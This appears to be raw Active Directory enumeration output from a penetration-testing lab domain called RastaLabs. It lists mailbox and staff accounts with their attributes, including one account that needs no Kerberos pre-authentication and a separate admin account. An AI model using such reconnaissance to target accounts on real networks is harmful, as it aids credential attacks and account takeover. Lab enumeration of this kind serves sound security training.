msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25297
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:26:11
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:26:11
whenchanged                           : 15/10/2017 14:26:22
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox3302aa9f11af4986b0bd16abdcb40a91,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {160, 86, 213, 100...}
cn                                    : HealthMailbox3302aa9f11af4986b0bd16abdcb40a91
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox3302aa9f11af4986b0bd16abdcb40a91
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox3302aa9f11af4986b0bd16abdcb40a91
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {47, 6, 217, 190...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox78a8527
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e@rastalabs.local, 
                                        SIP:HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25326
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-009
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1148
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 5aa10660-1762-45ee-99f8-db9ee1ac0651
whencreated                           : 15/10/2017 14:26:22
msexchumdtmfmap                       : {emailAddress:432584624526978285272163142432206962617232273, 
                                        lastNameFirstName:43258462452696901009, firstNameLastName:43258462452696901009}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=c43dc631e22241b6a4d3ac54e4b908ac-HealthMailbox7
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-009
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25309
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:26:22
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:26:22
whenchanged                           : 15/10/2017 14:26:32
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {78, 232, 1, 253...}
cn                                    : HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox78a8527b16d14c4fbc0696b6172ecc7e
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox1c0e846c494b4efc930fba944ce4ca93@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {247, 255, 162, 6...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox1c0e846
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox1c0e846c494b4efc930fba944ce4ca93@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox1c0e846c494b4efc930fba944ce4ca93@rastalabs.local, 
                                        SIP:HealthMailbox1c0e846c494b4efc930fba944ce4ca93@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25328
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-010
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1149
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 811c934b-a29e-4e90-8047-b06d5b90250b
whencreated                           : 15/10/2017 14:26:32
msexchumdtmfmap                       : {emailAddress:432584624526912038462494243329303229442342293, 
                                        lastNameFirstName:43258462452696901010, firstNameLastName:43258462452696901010}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=ad53a18464bc41268b1739fc225fe463-HealthMailbox1
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-010
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25321
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:26:32
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:26:32
whenchanged                           : 15/10/2017 14:26:43
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox1c0e846c494b4efc930fba944ce4ca93,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {134, 254, 232, 169...}
cn                                    : HealthMailbox1c0e846c494b4efc930fba944ce4ca93
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox1c0e846c494b4efc930fba944ce4ca93
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox1c0e846c494b4efc930fba944ce4ca93
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

name                            : Eleanor Pugh
logoncount                      : 244
lastlogontimestamp              : 13/03/2026 03:08:10
badpasswordtime                 : 13/03/2026 15:12:19
mailnickname                    : epugh
msexchdumpsterquota             : 31457280
msexchumdtmfmap                 : {emailAddress:37844, lastNameFirstName:78443532667, firstNameLastName:35326677844}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Eleanor Pugh
samaccounttype                  : USER_OBJECT
userprincipalname               : epugh@rastalabs.local
cn                              : Eleanor Pugh
msexchuseraccountcontrol        : 0
physicaldeliveryofficename      : Telford
primarygroupid                  : 513
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-1151
codepage                        : 0
samaccountname                  : epugh
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
homedirectory                   : \\fs01.rastalabs.local\home$\epugh
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : NEVER
countrycode                     : 0
whenchanged                     : 13/03/2026 03:08:10
instancetype                    : 4
usncreated                      : 25389
objectguid                      : e7332aec-2a7c-4606-888a-011f85621043
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
department                      : IT
msexcharchivewarnquota          : 94371840
proxyaddresses                  : SMTP:epugh@rastalabs.local
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Eleanor Pugh,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                  14:24:59...}
givenname                       : Eleanor
title                           : Infrastructure Engineer
msexchwhenmailboxcreated        : 15/10/2017 14:52:28
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 03:08:10
sn                              : Pugh
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchtextmessagingstate        : {302120705, 16842751}
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 139
homedrive                       : M:
msexchrecipienttypedetails      : 1
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                     : 15/10/2017 14:40:11
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=366a91dacb244bfcb30cd0e05ac8cd68-Eleanor Pugh
msexchversion                   : 88218628259840
pwdlastset                      : 27/10/2017 14:28:43
mail                            : epugh@rastalabs.local
usnchanged                      : 1499374
msexchmailboxguid               : {110, 140, 196, 203...}
lastlogoff                      : 01/01/1601 00:00:00
msexchdumpsterwarningquota      : 20971520

name                            : Bradley Owen
logoncount                      : 1924
lastlogontimestamp              : 13/03/2026 03:08:05
badpasswordtime                 : 13/03/2026 15:12:19
msexchuserculture               : en-US
mailnickname                    : bowen
msexchumdtmfmap                 : {emailAddress:26936, lastNameFirstName:69362723539, firstNameLastName:27235396936}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Bradley Owen
samaccounttype                  : USER_OBJECT
userprincipalname               : bowen@rastalabs.local
cn                              : Bradley Owen
msexchuseraccountcontrol        : 0
physicaldeliveryofficename      : Kent
usncreated                      : 25397
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-1152
codepage                        : 0
samaccountname                  : bowen
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
homedirectory                   : \\fs01.rastalabs.local\home$\bowen
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : NEVER
countrycode                     : 0
whenchanged                     : 13/03/2026 03:08:05
instancetype                    : 4
title                           : Finance Manager
objectguid                      : d0a8ccf9-2c73-4c79-bed6-56dd36d1587e
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
department                      : Finance
msexchwhenmailboxcreated        : 15/10/2017 14:52:14
msexcharchivewarnquota          : 94371840
proxyaddresses                  : SMTP:bowen@rastalabs.local
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Bradley Owen,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                  14:24:59...}
givenname                       : Bradley
msexchdumpsterquota             : 31457280
primarygroupid                  : 513
memberof                        : CN=Finance,CN=Users,DC=rastalabs,DC=local
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 19:18:59
sn                              : Owen
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchtextmessagingstate        : {302120705, 16842751}
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 0
homedrive                       : H:
msexchrecipienttypedetails      : 1
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                     : 15/10/2017 14:40:35
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=1ec67ba8aa474edba4351965fb83818d-Bradley Owen
msexchversion                   : 88218628259840
pwdlastset                      : 23/10/2017 17:22:42
mail                            : bowen@rastalabs.local
usnchanged                      : 1499361
msexchmailboxguid               : {67, 101, 224, 181...}
lastlogoff                      : 01/01/1601 00:00:00
msexchdumpsterwarningquota      : 20971520

name                            : Nicholas Godfrey
logoncount                      : 617
lastlogontimestamp              : 13/03/2026 03:08:09
badpasswordtime                 : 13/03/2026 15:06:14
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
mailnickname                    : ngodfrey
msexchumdtmfmap                 : {emailAddress:64633739, lastNameFirstName:463373964246527, 
                                  firstNameLastName:642465274633739}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Nicholas Godfrey
samaccounttype                  : USER_OBJECT
userprincipalname               : ngodfrey@rastalabs.local
cn                              : Nicholas Godfrey
msexchuseraccountcontrol        : 0
physicaldeliveryofficename      : Kent
usncreated                      : 25406
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-1153
codepage                        : 0
samaccountname                  : ngodfrey
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
homedirectory                   : \\fs01.rastalabs.local\home$\ngodfrey
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : NEVER
countrycode                     : 0
whenchanged                     : 13/03/2026 03:08:09
instancetype                    : 4
title                           : Desktop Support Engineer
objectguid                      : ea052ed7-a74e-44dd-a0c4-ce8757e102a5
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
msexchuserculture               : en-GB
department                      : IT
msexchwhenmailboxcreated        : 15/10/2017 14:52:41
msexcharchivewarnquota          : 94371840
proxyaddresses                  : SMTP:ngodfrey@rastalabs.local
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Nicholas Godfrey,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                  14:24:59...}
givenname                       : Nicholas
msexchdumpsterquota             : 31457280
primarygroupid                  : 513
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 17:10:55
sn                              : Godfrey
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchtextmessagingstate        : {302120705, 16842751}
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 0
homedrive                       : M:
msexchrecipienttypedetails      : 1
msds-supportedencryptiontypes   : 0
whencreated                     : 15/10/2017 14:41:07
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=a1efe50b013e470c9f64485b73795b38-Nicholas Godfr
msexchversion                   : 88218628259840
pwdlastset                      : 15/11/2017 10:01:37
mail                            : ngodfrey@rastalabs.local
usnchanged                      : 1499370
msexchmailboxguid               : {171, 197, 40, 48...}
lastlogoff                      : 01/01/1601 00:00:00
msexchdumpsterwarningquota      : 20971520

name                            : Rhys Weston
logoncount                      : 343
lastlogontimestamp              : 13/03/2026 03:08:10
badpasswordtime                 : 13/03/2026 15:12:20
mailnickname                    : rweston
msexchdumpsterquota             : 31457280
msexchumdtmfmap                 : {emailAddress:7937866, lastNameFirstName:9378667497, firstNameLastName:7497937866}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Rhys Weston
samaccounttype                  : USER_OBJECT
userprincipalname               : rweston@rastalabs.local
cn                              : Rhys Weston
msexchuseraccountcontrol        : 0
physicaldeliveryofficename      : Telford
primarygroupid                  : 513
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-1154
codepage                        : 0
samaccountname                  : rweston
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
homedirectory                   : \\fs01.rastalabs.local\home$\rweston
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : NEVER
countrycode                     : 0
whenchanged                     : 13/03/2026 03:08:10
instancetype                    : 4
usncreated                      : 25413
objectguid                      : eefaa19e-0d7a-4e0b-be80-4c4b6ffdda1a
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
department                      : IT
msexchuserculture               : en-GB
msexcharchivewarnquota          : 94371840
proxyaddresses                  : SMTP:rweston@rastalabs.local
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Rhys Weston,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                  14:24:59...}
givenname                       : Rhys
title                           : Senior Infrastructure Engineer
msexchwhenmailboxcreated        : 15/10/2017 14:52:35
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 17:21:37
sn                              : Weston
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchtextmessagingstate        : {302120705, 16842751}
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 0
homedrive                       : M:
msexchrecipienttypedetails      : 1
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                     : 15/10/2017 14:42:01
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=fee4e43986034f6fa976cb0f6c226fd5-Rhys Weston
msexchversion                   : 88218628259840
pwdlastset                      : 27/10/2017 14:18:06
mail                            : rweston@rastalabs.local
usnchanged                      : 1499373
msexchmailboxguid               : {75, 172, 252, 94...}
lastlogoff                      : 01/01/1601 00:00:00
msexchdumpsterwarningquota      : 20971520

name                       : Eleanor Pugh (Admin)
logoncount                 : 265
badpasswordtime            : 12/10/2023 19:49:21
distinguishedname          : CN=Eleanor Pugh (Admin),CN=Users,DC=rastalabs,DC=local
objectclass                : {top, person, organizationalPerson, user}
displayname                : Eleanor Pugh (Admin)
samaccounttype             : USER_OBJECT
userprincipalname          : epugh_adm@rastalabs.local
msexchuseraccountcontrol   : 0
usncreated                 : 45082
objectsid                  : S-1-5-21-1396373213-2872852198-2033860859-1159
samaccountname             : epugh_adm
lastlogontimestamp         : 15/10/2023 22:28:33
codepage                   : 0
msexchhomeservername       : /o=RastaLabs/ou=Exchange Administrative Group 
                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexchumdtmfmap            : {lastNameFirstName:78443532667, firstNameLastName:35326677844}
accountexpires             : NEVER
cn                         : Eleanor Pugh (Admin)
whenchanged                : 15/10/2023 21:28:33
instancetype               : 4
title                      : Infrastructure Engineer
objectguid                 : ac06afcb-4296-443b-9a50-1328bddcfc6f
department                 : IT
lastlogoff                 : 01/01/1601 00:00:00
objectcategory             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata      : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 14:24:59...}
givenname                  : Eleanor
msexchdumpsterquota        : 31457280
memberof                   : CN=Infrastructure Support,CN=Users,DC=rastalabs,DC=local
mdbusedefaults             : True
lastlogon                  : 16/10/2023 08:37:26
sn                         : Pugh
